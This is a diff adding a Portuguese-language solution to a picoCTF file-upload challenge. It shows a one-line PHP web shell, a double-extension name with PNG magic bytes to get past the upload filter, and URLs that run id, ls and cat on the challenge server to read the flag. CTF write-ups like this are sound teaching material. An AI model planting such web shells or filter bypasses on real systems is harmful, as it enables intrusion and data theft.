@@ -11,6 +11,36 @@ Detalhes adicionais estarão disponíveis após o lançamento de sua instância 
 
 ## Solução  
 
+Abrimos a URL do desafio e identificamos uma funcionalidade de upload que aceita apenas arquivos .png.
+
+Criamos um arquivo yo.php com uma simples payload PHP (<?=\$_GET[0]`?>`).
+
+Tentamos enviá-lo, mas o servidor rejeitou, indicando que o nome do arquivo precisava conter .png.
+
+Renomeamos o arquivo para yo.png.php e tentamos o upload novamente.
+O servidor aceitou o nome, mas ainda rejeitou o arquivo dizendo que não era um PNG válido.
+
+Pegamos os bytes mágicos do PNG (89 50 4E 47 0D 0A 1A 0A).
+Criamos um arquivo base.png, abrimos em um editor hexadecimal e inserimos os bytes mágicos no início.
+No final do arquivo, adicionamos a payload PHP (<?=\$_GET[0]`?>`).
+Renomeamos para yo.png.php e fizemos o upload novamente.
+
+Testamos diretórios comuns (/uploads/, /files/, /images/) e encontramos nosso arquivo em:
+
+http://atlas.picoctf.net:62573/uploads/yo.png.php
+
+Testamos a execução de código com ?0=id, confirmando o acesso
+
+http://atlas.picoctf.net:62573/uploads/yo.png.php?0=id
+
+Listamos arquivos no diretório
+
+http://atlas.picoctf.net:62573/uploads/yo.png.php?0=ls ..
+
+Encontramos GQ4DOOBVMMYGK.txt e lemos o conteúdo
+
+http://atlas.picoctf.net:62573/uploads/yo.png.php?0=cat%20../GQ4DOOBVMMYGK.txt
+
 
 
 ![image](https://github.com/user-attachments/assets/5a513762-7cf8-4af4-8382-ff46da02f5dc)
